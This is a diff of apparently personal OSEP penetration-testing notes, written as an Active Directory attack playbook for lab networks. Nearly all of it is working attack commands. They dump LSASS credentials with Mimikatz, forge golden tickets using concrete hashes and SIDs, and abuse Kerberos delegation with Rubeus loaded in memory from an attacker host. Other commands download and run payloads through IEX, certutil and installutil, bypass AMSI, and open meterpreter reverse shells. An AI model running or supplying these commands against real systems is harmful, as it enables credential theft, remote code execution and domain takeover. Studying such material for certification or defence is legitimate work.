@@ -1,29 +1,23 @@
 `https://steflan-security.com/offensive-security-experienced-penetration-tester-osep-review/`
 
 # todo
-- tidy up OSEP code snippets - see [[#Combining the pieces]] at the bottom
-	- https://github.com/dafthack/HostRecon
-- asciinema prep
+- add adpeas and adpeas-Light
+- take useful commands from lab writeups to navi cheatsheets
+- test sharphound in memory with powershell
 - sectioned shellcode runner
 - test python bloodhound on challenge 5 main repo doesn't do kerberos yet use https://github.com/jazzpizazz/BloodHound.py-Kerberos
-- tidy resource based contrained delegation with rubeus.txt instead of invoke-rubeus use challenge 5 notes
-- add https://github.com/fortra/impacket/blob/master/examples/raiseChild.py to forest privesc
-- https://github.com/projectdiscovery/naabu and static nmap
-- https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
-- https://github.com/eladshamir/Whisker
-- https://github.com/Flangvik/SharpCollection
-- https://github.com/franc-pentest/ldeep
-- take useful commands from lab writeups to navi cheatsheets
-- mimikatz can log to cheatsheet with `log lsass.txt`
-- update osep-code-snippets with code for turning on RPC
+- https://github.com/eladshamir/Whisker Shadow Credentials?
+- update osep-code-snippets with code for turning on RPC (challenge 6)
+- asciinema prep
 # playbook
 - upload payload with AV bypass (bypass AV)
 - migrate to a different process (process injection via meterpreter)
 - shell > powershell (Bypass-AMSI)
 - alternatively build msbuild xml files you want to run on the system
-- perform post exploit enumeration (WinPeas.ps1/Invoke-Seatbelt)
+- perform post exploit enumeration (winpeas-memory/Invoke-Seatbelt)
 - perform active directory enumeration (powerview.ps1/SharpHound.ps1)
 	- note down high value targets (domain admin)
+	- manually search for unconstrained delegation
 - privesc (then privesc again to SYSTEM if you are local admin that wants AD access)
 - disable defences
 - after getting system shell migrate to spoolsv
@@ -953,6 +947,9 @@ IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/Invo
 # equivalent to Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords"
 Invoke-Mimikatz -DumpCreds
 
+# mimikatz can log to cheatsheet with 'log lsass.txt' eg:
+Invoke-Mimikatz -Command 'privilege::debug "log logonpasswords.txt" sekurlsa::logonpasswords'
+
 # via cmd
 powershell -ExecutionPolicy Bypass -Command "Import-Module .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -Command 'privilege::debug token::elevate sekurlsa::logonpasswords'"
 ```
@@ -967,7 +964,7 @@ Task Manager > Details Tab > Right-click lsass.exe > Create dump file
 # powershell with admin priv
 PS C:\Windows\system32> cd ~
 PS C:\Users\admin.CORP1> cp C:\Users\ADMIN~1.COR\AppData\Local\Temp\lsass.DMP .
-Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords'
+Invoke-Mimikatz -Command 'privilege::debug "sekurlsa::minidump lsass.dmp" sekurlsa::logonpasswords'
 ```
 ## Dump LSASS via CLI
 `OSEP-Code-Snippets/MiniDump/bin/x64/Release/MiniDump.exe`
@@ -1579,9 +1576,10 @@ IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.190/SharpHound.p
 Invoke-BloodHound -CollectionMethod All
 # if there are multiple domains
 Invoke-BloodHound -CollectionMethod All -SearchForest
+# from kali
+proxychains bloodhound-python -k -no-pass -u pete@complyedge.com -d complyedge.com -dc  dmzdc01.complyedge.com -ns 172.16.234.168 -c All --dns-tcp --dns-timeout 20 --auth-method kerberos
 
 # see also
-https://github.com/layer8secure/SilentHound
 https://github.com/NH-RED-TEAM/RustHound
 ```
 Graphing
@@ -1687,13 +1685,13 @@ force dc to connect to application service using SpoolSample.exe
 dir \\cdc01\pipe\spoolss
 
 # with admin priv load rubeus into memory
-$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/rubeus.txt')
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.204/win/rubeus.txt')
 $RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
 [Rubeus.Program]::Main("monitor /interval:5 /filteruser:DC03$ /nowrap".Split())
 
 # in a seperate terminal
 .\SpoolSample.exe  APPSRV01
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-SpoolSample.ps1")
+IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.204/win/Invoke-SpoolSample.ps1")
 Invoke-SpoolSample -Target '<hostname>' -CaptureServer '<hostname>'
 Invoke-SpoolSample -Target 'CDC01.prod.corp1.com' -CaptureServer 'APPSRV01.prod.corp1.com'
 
@@ -1721,10 +1719,10 @@ impacket-lookupsid prod/offsec@192.168.178.75
 ...
 # craft golden ticket
 impacket-ticketer -nthash cce9d6cd94eb31ccfbb7cc8eeadf7ce1 -domain-sid S-1-5-21-749318035-33825885-105668094 -domain prod newAdmin
-export KRB5CCNAME=$PWD/fakeuser.ccache
+export KRB5CCNAME=$PWD/newAdmin.ccache
 # alternative: inject golden ticket directly into memory
 mimikatz # kerberos::golden /domain:prod.corp1.com /sid:S-1-5-21-749318035-33825885-105668094 /rc4:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /user:newAdmin /id:500 /ptt
-
+Invoke-Mimikatz -Command '"kerberos::golden /domain:prod.corp1.com /sid:S-1-5-21-749318035-33825885-105668094 /rc4:cce9d6cd94eb31ccfbb7cc8eeadf7ce1 /user:newAdmin /id:500 /ptt"'
 sudo vim /etc/hosts
 ...
 192.168.178.70 prod.corp1.com cdc01.prod.corp1.com
@@ -1848,19 +1846,20 @@ useraccountcontrol       : ..., TRUSTED_TO_AUTH_FOR_DELEGATION <-- indication of
 ```
 # obtain creds (plaintext or hash) of user with TRUSTED_TO_AUTH_FOR_DELEGATION
 # scenario specific: generate the NTLM hash from KNOWN plain text password for IISSvc user
-. .\Invoke-Rubeus.ps1
-Invoke-Rubeus -Command "hash /password:lab"
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.246/rubeus.txt')
+$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+[Rubeus.Program]::Main("hash /password:lab".Split())
 
 # use the result as the value for the rc4 parameter to get TGT
-Invoke-Rubeus -Command "asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E"
+[Rubeus.Program]::Main("asktgt /user:iissvc /domain:prod.corp1.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E".Split())
 ...
 [*] base64(ticket.kirbi):
       doIE+jCCBPagAwIBBaEDAgEWooIECzCCBAdhggQDMIID/6A...
 ...
 # S4U2Self and S4U2Proxy to get service ticket for mssql
-Invoke-Rubeus -Command "s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt"
+[Rubeus.Program]::Main("s4u /ticket:doIE+jCCBP... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt".Split())
 # alternatively: without needing to input TGT
-Invoke-Rubeus -Command "s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt"
+[Rubeus.Program]::Main("s4u /user:iissvc /rc4:2892D26CDF84D7A70E2EB3B9F05C425E /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /ptt".Split())
 
 # continue attack chain on MSSQL
 \\192.168.45.206\vscode\OSEP-Code-Snippets\MSSQL\bin\Release\MSSQL.exe
@@ -1888,7 +1887,7 @@ klist
 # files needed on compromised machine:
 - powerview.ps1
 - powermad.ps1
-- Invoke-Rubeus.ps1
+- Rubeus.exe -> rubeus.txt
 
 # enumerate for GenericWrite
 Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}} | Format-Table Identity, ObjectDN, ActiveDirectoryRights -Wrap
@@ -1931,22 +1930,17 @@ SecurityIdentifier : S-1-5-21-3776646582-2086779273-4091361643-2101
 ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-2101
 
 # continue abuse constained delegation
-. .\Invoke-Rubeus.ps1
-Invoke-Rubeus -Command "hash /password:h4x"
-Invoke-Rubeus -Command "s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt"
+$content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/rubeus.txt')
+# alternatively: 
+$content = (Invoke-WebRequest -Uri "http://192.168.45.197/rubeus.txt").Content
+$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($content))
+[Rubeus.Program]::Main("hash /password:h4x)
+[Rubeus.Program]::Main("s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt)
+
 # verify and continue attack chain
 klist
 dir \\appsrv01.prod.corp1.com\c$
 ```
-## kirbi ccache converter
-```
-# kirbi to ccache
-msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.kirbi outputpath=ticket.ccache
-
-# ccache to kirbi
-msf6 auxiliary(admin/kerberos/ticket_converter) > run inputpath=ticket.ccache outputpath=ticket.kirbi
-```
-
 # forest
 ```
 # enumeration
@@ -2015,7 +2009,6 @@ whoami /groups
 - runas admin; powershell -ep bypass
 IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-SpoolSample.ps1")
 IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Mimikatz2.ps1")
-IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.197/Invoke-Rubeus.ps1")
 # alternative use rubeus.txt
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("./Rubeus.exe")) | Out-File -Encoding ASCII rubeus.txt
 $content = (New-Object System.Net.WebClient).DownloadString('http://192.168.45.197/rubeus.txt')
@@ -2097,6 +2090,11 @@ S-1-5-21-3759240818-3619593844-2110795065
 
 Invoke-Mimikatz -Command '"kerberos::golden /user:h4x /domain:corp1.com /sid:S-1-5-21-1587569303-1110564223-1586047116 /krbtgt:22722f2e5074c2f03938f6ba2de5ae5c /sids:S-1-5-21-3759240818-3619593844-2110795065-519 /ptt"'
 ```
+via impackets raiseChild
+```
+impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>
+impacket-raiseChild -hashes <LMHASH>:<NTHASH> <CHILD_DOMAIN>/<ADMIN_USER>:'<PASS>'
+```
 ### Troubleshooting
 ```
 # be aware the golden ticket may not work due to SID filtering
@@ -2145,13 +2143,6 @@ setspn -T prod -Q MSSQLSvc/*
 setspn -T corp1 -Q MSSQLSvc/*
 setspn -T corp2.com -Q MSSQLSvc/*
 ```
-# Combining the pieces
-```
-Enumeration with HostRecon
-check application whitelisting
-bypass amsi
-check priv use custom printspoofer and use spoolsample
-```
 # mono setup
 ```
 # add the mono repo for debian 11
@@ -2199,6 +2190,9 @@ net use \\192.168.49.102\share
 ```
 see what powershell binary you want from this list:
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack
+```
+>below block is navi'd
+```
 # make sure you bypass AMSI first
 IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.242/powerview.ps1")
 Invoke-Spoolsample -Command "<YOUR_COMMAND_COES_HERE>"
@@ -2224,8 +2218,6 @@ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/re
 # download, decode and execute; use '&&' instead of ';' for cmd
 certutil -urlcache -split -f "http://192.168.45.168/file.txt"; certutil -decode file.txt bypass.exe; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
 ```
-# compiled binaries
-https://github.com/r3motecontrol/Ghostpack-CompiledBinaries
 # run powershell as admin
 ```powershell
 $psi = New-Object System.Diagnostics.ProcessStartInfo
@@ -2236,51 +2228,4 @@ $psi.UseShellExecute = $true
 $psi.RedirectStandardOutput = $false
 
 $process = [System.Diagnostics.Process]::Start($psi)
-```
-
-# add to navi stuff
-## meterpreter pivoting
-```
-# add routes and use proxy for pivoting
-msf6 exploit(multi/handler) > use multi/manage/autoroute
-msf6 post(multi/manage/autoroute) > set session 1
-msf6 post(multi/manage/autoroute) > exploit
-msf6 post(multi/manage/autoroute) > route print
-msf6 post(multi/manage/autoroute) > use auxiliary/server/socks_proxy
-msf6 auxiliary(server/socks_proxy) > set srvhost 127.0.0.1
-msf6 auxiliary(server/socks_proxy) > exploit -j
-
-# port scan via pivot
-msf6 post(multi/manage/autoroute) > use auxiliary/scanner/portscan/tcp
-msf6 auxiliary(scanner/portscan/tcp) > set RHOST 172.16.234.151
-```
-## generate powershell base64 command
-```
-kali@kali:~$ pwsh
-PS /home/kali> $text = "(New-Object System.Net.WebClient).DownloadString('http://<KALI_IP>/run.txt') | IEX"
-PS /home/kali> [Convert]::ToBase64String( [System.Text.Encoding]::Unicode.GetBytes($text))
-KABOAGUA...==
-powershell -enc KABOAGUA...==
-```
-## duplicate meterpreter sessions
-```
-# FIRST start another multi/handler in the background (exploit -j) 
-use post/windows/manage/multi_meterpreter_inject
-set iplist 192.168.45.203
-set lport 443
-set payload windows/x64/meterpreter/reverse_https
-set session 2
-exploit
-```
-## execute files directly from smb
-```
-C:\Windows\system32>cd \windows\tasks
-C:\Windows\Tasks>net use \\192.168.45.189\vscode /user:kali kali
-C:\Windows\Tasks>\\192.168.45.189\vscode\OSEP-Code-Snippets\MiniDump\bin\x64\Release\MiniDump.exe
-```
-# github tokens
-
-```
-Settings > Developer Tools > Access Tokens
-git remote set-url origin https://thamyekh:github_pat_1...<REMAINDER_OF_TOKEN>@github.com/thamyekh/OSEP-Code-Snippets.git
 ```
